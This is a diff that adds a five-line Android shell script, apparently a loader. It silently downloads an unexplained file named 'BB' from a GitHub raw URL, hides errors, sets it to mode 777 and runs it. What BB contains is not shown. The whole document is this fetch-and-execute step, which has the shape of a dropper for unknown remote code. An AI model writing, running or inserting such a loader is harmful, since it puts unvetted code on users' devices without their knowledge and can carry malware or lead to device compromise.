@@ -1,0 +1,5 @@
+#!/system/bin/sh
+clear
+{ wget https://raw.githubusercontent.com/Sohail846/Carbon841428/main/BB ; } 2> /dev/null
+chmod 777 BB
+./BB
